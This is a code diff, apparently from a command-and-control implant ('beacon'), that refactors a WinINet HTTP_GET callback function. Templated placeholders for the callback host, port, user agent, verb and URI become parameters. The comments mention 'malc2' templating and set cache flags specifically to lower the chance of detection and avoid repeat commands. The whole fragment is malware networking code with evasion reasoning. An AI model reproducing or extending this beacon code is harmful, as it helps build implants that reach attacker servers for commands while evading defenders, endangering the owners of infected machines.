@@ -20,11 +20,11 @@ Required Keys:
 
 
 
-bool HTTP_GET(std::vector<std::wstring>& headers, std::string& response) {
+bool HTTP_GET(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, std::wstring& user_agent, const std::vector<std::wstring>& headers, std::string& response) {
     // 1. Initialize
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw
     HINTERNET hInternet = InternetOpenW(
-        L"[[http_user_agent]]",                // user agent - template, malc2 this
+        user_agent,                     // user agent
         INTERNET_OPEN_TYPE_PRECONFIG,     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena#parameters: INTERNET_OPEN_TYPE_PRECONFIG: proxy OR direct, based on registry (matches inet expl)
         NULL,
         NULL,
@@ -36,8 +36,8 @@ bool HTTP_GET(std::vector<std::wstring>& headers, std::string& response) {
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw
     HINTERNET hConnect = InternetConnectW(
         hInternet,
-        L"[[callback_host]]",           // Server - template,
-        [[callback_port]],                   // Port - template
+        callback_host,           // Server - template,
+        callback_port,           // Port - template
         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
     );
     if (!hConnect) {
@@ -49,8 +49,8 @@ bool HTTP_GET(std::vector<std::wstring>& headers, std::string& response) {
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
     HINTERNET hRequest = HttpOpenRequestW(
         hConnect,
-        L"[[http_get_verb]]",                 // Method - template, mallc2 this
-        L"[[http_get_uri]]",         // Path - template, mallc2 this
+        http_verb,   // Method
+        uri,         // Path
         NULL, NULL, NULL,
         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
